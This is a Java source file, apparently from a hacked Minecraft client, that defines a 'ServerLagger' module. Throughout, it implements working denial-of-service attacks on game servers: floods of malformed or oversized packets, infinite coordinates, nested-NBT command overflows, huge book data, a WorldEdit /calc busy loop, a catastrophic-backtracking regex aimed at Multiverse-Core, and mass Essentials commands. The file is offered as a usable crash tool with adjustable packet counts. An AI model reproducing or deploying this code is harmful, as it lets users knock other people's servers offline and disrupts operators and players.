package me.hextech.remapped;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.Full;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.OnGroundOnly;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.apache.commons.lang3.RandomStringUtils;

public class ServerLagger_xbIbOIunYFUorlZcLJkD extends Module_eSdgMXWuzcxgQVaJFmKZ {
   private final EnumSetting<ServerLagger> mode = this.add(new EnumSetting("Mode", ServerLagger.Selector));
   private final SliderSetting offhandPackets = this.add(
      new SliderSetting("OPackets", 1000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.OffhandSpam)
   );
   private final SliderSetting vehiclePackets = this.add(
      new SliderSetting("VPackets", 2000.0, 100.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Vehicle || this.mode.getValue() == ServerLagger.Boat)
   );
   private final SliderSetting creativePackets = this.add(
      new SliderSetting("CPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.CreativePacket)
   );
   private final SliderSetting bookPackets = this.add(
      new SliderSetting(
         "BookPackets", 100.0, 1.0, 1000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Book || this.mode.getValue() == ServerLagger.CreativeBook
      )
   );
   private final SliderSetting aacPackets = this.add(
      new SliderSetting(
         "AACPackets",
         5000.0,
         1.0,
         10000.0,
         1.0,
         v -> this.mode.getValue() == ServerLagger.AAC || this.mode.getValue() == ServerLagger.AAC2 || this.mode.getValue() == ServerLagger.NullPosition
      )
   );
   private final SliderSetting clickSlotPackets = this.add(
      new SliderSetting("SlotPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.InvalidClickSlot)
   );
   private final SliderSetting interactPackets = this.add(
      new SliderSetting(
         "IPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.InteractNoCom || this.mode.getValue() == ServerLagger.InteractItem
      )
   );
   private final SliderSetting movementPackets = this.add(
      new SliderSetting("MPackets", 2000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == ServerLagger.MovementSpam)
   );
   private final SliderSetting craftPackets = this.add(
      new SliderSetting("CraftPackets", 3.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == ServerLagger.Crafting)
   );
   private final SliderSetting sequencePackets = this.add(
      new SliderSetting(
         "SPackets", 200.0, 50.0, 2000.0, 1.0, v -> this.mode.getValue() == ServerLagger.SequenceBlock || this.mode.getValue() == ServerLagger.SequenceItem
      )
   );
   private final SliderSetting commandPackets = this.add(new SliderSetting("Count", 3.0, 1.0, 5.0, 1.0, v -> this.mode.getValue() == ServerLagger.Selector));
   private final SliderSetting length = this.add(new SliderSetting("Length", 2032.0, 1000.0, 3000.0, 1.0, v -> this.mode.getValue() == ServerLagger.Selector));
   private final BooleanSetting autoDisable = this.add(new BooleanSetting("AutoDisable", true));
   private final BooleanSetting smartDisable = this.add(new BooleanSetting("SmartDisable", true));
   private final SliderSetting delay = this.add(new SliderSetting("Delay", 1.0, 0.0, 100.0, 1.0).setSuffix("tick"));
   int slot = 5;
   int ticks = 0;

   public ServerLagger_xbIbOIunYFUorlZcLJkD() {
      super("ServerLagger", Module_JlagirAibYQgkHtbRnhw.Player);
   }

   public static double rndD(double rad) {
      Random r = new Random();
      return r.nextDouble() * rad;
   }

   @Override
   public void onUpdate() {
      if (nullCheck()) {
         if (this.autoDisable.getValue()) {
            this.disable();
         }
      } else {
         this.ticks++;
         if (!((double)this.ticks <= this.delay.getValue())) {
            this.ticks = 0;
            switch ((ServerLagger)this.mode.getValue()) {
               case Selector:
                  String overflow = this.generateJsonObject(this.length.getValueInt());
                  String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);

                  for (int i = 0; (double)i < this.commandPackets.getValue(); i++) {
                     mc.field_1724.field_3944.method_52787(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                  }

                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case Crafting:
                  if (!(mc.field_1724.field_7512 instanceof CraftingScreenHandler) || mc.method_1562() == null) {
                     return;
                  }

                  try {
                     for (RecipeResultCollection recipeResultCollection : mc.field_1724.method_3130().method_1393()) {
                        for (RecipeEntry<?> recipe : recipeResultCollection.method_2648(true)) {
                           for (int i = 0; (double)i < this.craftPackets.getValue(); i++) {
                              mc.method_1562().method_52787(new CraftRequestC2SPacket(mc.field_1724.field_7512.field_7763, recipe, true));
                           }
                        }
                     }
                  } catch (Exception var12) {
                     CommandManager.sendChatMessage("§4[!] " + var12.getMessage());
                     var12.printStackTrace();
                     if (this.smartDisable.getValue()) {
                        this.disable();
                     }
                  }
                  break;
               case SequenceItem:
                  for (int i = 0; (double)i < this.sequencePackets.getValue(); i++) {
                     mc.method_1562().method_52787(new PlayerInteractItemC2SPacket(Hand.field_5808, -1));
                  }
                  break;
               case SequenceBlock:
                  Vec3d pos = new Vec3d(mc.field_1724.method_23317(), mc.field_1724.method_23318(), mc.field_1724.method_23321());
                  BlockHitResult bhr = new BlockHitResult(pos, Direction.field_11033, BlockPos.method_49638(pos), false);

                  for (int i = 0; (double)i < this.sequencePackets.getValue(); i++) {
                     mc.method_1562().method_52787(new PlayerInteractBlockC2SPacket(Hand.field_5808, bhr, -1));
                  }
                  break;
               case MovementSpam:
                  if (mc.method_1562() == null) {
                     return;
                  }

                  try {
                     Vec3d current_pos = mc.field_1724.method_19538();

                     for (int i = 0; (double)i < this.movementPackets.getValue(); i++) {
                        Full move_packet = new Full(
                           current_pos.field_1352 + this.getDistributedRandom(1.0),
                           current_pos.field_1351 + this.getDistributedRandom(1.0),
                           current_pos.field_1350 + this.getDistributedRandom(1.0),
                           (float)rndD(90.0),
                           (float)rndD(180.0),
                           true
                        );
                        mc.method_1562().method_52787(move_packet);
                     }
                  } catch (Exception var11) {
                     CommandManager.sendChatMessage("§4[!] " + var11.getMessage());
                     var11.printStackTrace();
                     if (this.smartDisable.getValue()) {
                        this.disable();
                     }
                  }
                  break;
               case Lectern:
                  if (!(mc.field_1755 instanceof LecternScreen)) {
                     return;
                  }

                  mc.method_1562()
                     .method_52787(
                        new ClickSlotC2SPacket(
                           mc.field_1724.field_7512.field_7763,
                           mc.field_1724.field_7512.method_37421(),
                           0,
                           0,
                           SlotActionType.field_7794,
                           mc.field_1724.field_7512.method_34255().method_7972(),
                           Int2ObjectMaps.emptyMap()
                        )
                     );
                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case InteractNoCom:
                  for (int i = 0; (double)i < this.interactPackets.getValue(); i++) {
                     Vec3d cpos = this.pickRandomPos();
                     mc.method_1562()
                        .method_52787(
                           new PlayerInteractBlockC2SPacket(
                              Hand.field_5808, new BlockHitResult(cpos, Direction.field_11033, BlockPos.method_49638(cpos), false), 0
                           )
                        );
                  }
                  break;
               case InteractOOB:
                  Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
                  mc.method_1562()
                     .method_52787(
                        new PlayerInteractBlockC2SPacket(Hand.field_5808, new BlockHitResult(oob, Direction.field_11033, BlockPos.method_49638(oob), false), 0)
                     );
                  break;
               case InteractItem:
                  for (int i = 0; (double)i < this.interactPackets.getValue(); i++) {
                     mc.method_1562().method_52787(new PlayerInteractItemC2SPacket(Hand.field_5808, 0));
                  }
                  break;
               case InvalidClickSlot:
                  Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap();
                  REAL.put(0, new ItemStack(Items.field_8264, 1));

                  for (int i = 0; (double)i < this.clickSlotPackets.getValue(); i++) {
                     mc.method_1562()
                        .method_52787(
                           new ClickSlotC2SPacket(
                              mc.field_1724.field_7512.field_7763,
                              123344,
                              2957234,
                              2859623,
                              SlotActionType.field_7790,
                              new ItemStack(Items.field_8162, -1),
                              REAL
                           )
                        );
                  }
                  break;
               case AAC:
                  for (double i = 0.0; i < this.aacPackets.getValue(); i++) {
                     mc.method_1562()
                        .method_52787(
                           new PositionAndOnGround(
                              mc.field_1724.method_23317() + 9412.0 * i,
                              mc.field_1724.method_23318() + 9412.0 * i,
                              mc.field_1724.method_23321() + 9412.0 * i,
                              true
                           )
                        );
                  }

                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case AAC2:
                  for (double i = 0.0; i < this.aacPackets.getValue(); i++) {
                     mc.method_1562()
                        .method_52787(
                           new PositionAndOnGround(
                              mc.field_1724.method_23317() + 500000.0 * i,
                              mc.field_1724.method_23318() + 500000.0 * i,
                              mc.field_1724.method_23321() + 500000.0 * i,
                              true
                           )
                        );
                  }

                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case NullPosition:
                  for (double i = 0.0; i < this.aacPackets.getValue(); i++) {
                     mc.method_1562().method_52787(new PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                  }

                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case Book:
               case CreativeBook:
                  for (int i = 0; (double)i < this.bookPackets.getValue(); i++) {
                     this.sendBadBook();
                  }

                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case CreativePacket:
                  if (!mc.field_1724.method_31549().field_7477) {
                     if (this.smartDisable.getValue()) {
                        this.disable();
                     }

                     return;
                  }

                  Vec3d pos = this.pickRandomPos();
                  NbtCompound tag = new NbtCompound();
                  NbtList list = new NbtList();
                  ItemStack the = new ItemStack(Items.field_17346);
                  list.add(NbtDouble.method_23241(pos.field_1352));
                  list.add(NbtDouble.method_23241(pos.field_1351));
                  list.add(NbtDouble.method_23241(pos.field_1350));
                  tag.method_10566("Pos", list);
                  the.method_7959("BlockEntityTag", tag);

                  for (int i = 0; (double)i < this.creativePackets.getValue(); i++) {
                     mc.method_1562().method_52787(new CreativeInventoryActionC2SPacket(1, the));
                  }
                  break;
               case Boat:
                  Entity vehicle = mc.field_1724.method_5854();
                  if (vehicle == null) {
                     if (this.smartDisable.getValue()) {
                        this.disable();
                     }

                     return;
                  }

                  if (!(vehicle instanceof BoatEntity) && this.smartDisable.getValue()) {
                     this.disable();
                  }

                  for (int i = 0; (double)i < this.vehiclePackets.getValue(); i++) {
                     mc.method_1562().method_52787(new BoatPaddleStateC2SPacket(true, true));
                  }
                  break;
               case Vehicle:
                  Entity vehicle = mc.field_1724.method_5854();
                  if (vehicle == null) {
                     if (this.smartDisable.getValue()) {
                        this.disable();
                     }

                     return;
                  }

                  BlockPos start = mc.field_1724.method_24515();
                  Vec3d end = new Vec3d((double)start.method_10263() + 0.5, (double)(start.method_10264() + 1), (double)start.method_10260() + 0.5);
                  vehicle.method_30634(end.field_1352, end.field_1351 - 1.0, end.field_1350);

                  for (int i = 0; (double)i < this.vehiclePackets.getValue(); i++) {
                     mc.method_1562().method_52787(new VehicleMoveC2SPacket(vehicle));
                  }
                  break;
               case WorldEdit:
                  mc.field_1724.field_3944.method_45731("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case Chunk:
                  for (double yPos = mc.field_1724.method_23318(); yPos < 255.0; yPos += 5.0) {
                     mc.field_1724.field_3944.method_52787(new PositionAndOnGround(mc.field_1724.method_23317(), yPos, mc.field_1724.method_23321(), true));
                  }

                  for (double i = 0.0; i < 6685.0; i += 5.0) {
                     mc.field_1724
                        .field_3944
                        .method_52787(new PositionAndOnGround(mc.field_1724.method_23317() + i, 255.0, mc.field_1724.method_23321() + i, true));
                  }
                  break;
               case OffhandSpam:
                  for (int index = 0; (double)index < this.offhandPackets.getValue(); index++) {
                     mc.field_1724.field_3944.method_52787(new PlayerActionC2SPacket(Action.field_12969, BlockPos.field_10980, Direction.field_11036));
                     mc.field_1724.field_3944.method_52787(new OnGroundOnly(true));
                  }
                  break;
               case MultiverseCore:
                  mc.field_1724.field_3944.method_45731("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case Essentials:
                  mc.field_1724.field_3944.method_45731("pay * a a");
                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
                  break;
               case Promote:
                  mc.field_1724.field_3944.method_45731("promote * a");
                  if (this.smartDisable.getValue()) {
                     this.disable();
                  }
            }
         }
      }
   }

   private void sendBadBook() {
      String title = "/stop" + Math.random() * 400.0;
      String mm255 = RandomStringUtils.randomAlphanumeric(255);
      switch ((ServerLagger)this.mode.getValue()) {
         case Book:
            ArrayList<String> pages = new ArrayList();

            for (int i = 0; i < 50; i++) {
               pages.add(mm255);
            }

            mc.method_1562().method_52787(new BookUpdateC2SPacket(mc.field_1724.method_31548().field_7545, pages, Optional.of(title)));
            break;
         case CreativeBook:
            for (int i = 0; i < 5; i++) {
               if (this.slot > 45) {
                  this.slot = 0;
                  return;
               }

               this.slot++;
               ItemStack book = new ItemStack(Items.field_8360, 1);
               NbtCompound tag = new NbtCompound();
               NbtList list = new NbtList();

               for (int j = 0; j < 99; j++) {
                  list.add(NbtString.method_23256("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
               }

               tag.method_10566("author", NbtString.method_23256(RandomStringUtils.randomAlphabetic(9000)));
               tag.method_10566("title", NbtString.method_23256(RandomStringUtils.randomAlphabetic(25564)));
               tag.method_10566("pages", list);
               book.method_7980(tag);
               mc.field_1724.field_3944.method_52787(new CreativeInventoryActionC2SPacket(this.slot, book));
            }
      }
   }

   public double getDistributedRandom(double rad) {
      return rndD(rad) - rad / 2.0;
   }

   private Vec3d pickRandomPos() {
      return new Vec3d((double)new Random().nextInt(16777215), 255.0, (double)new Random().nextInt(16777215));
   }

   private String generateJsonObject(int levels) {
      String json = (String)IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
      return "{a:" + json + "}";
   }

   @Override
   public String getInfo() {
      return ((ServerLagger)this.mode.getValue()).name();
   }

   @Override
   public void onDisable() {
      this.ticks = 999;
   }

   @Override
   public void onLogin() {
      if (this.autoDisable.getValue()) {
         this.disable();
      }
   }

   @Override
   public void onLogout() {
      if (this.autoDisable.getValue()) {
         this.disable();
      }
   }
}
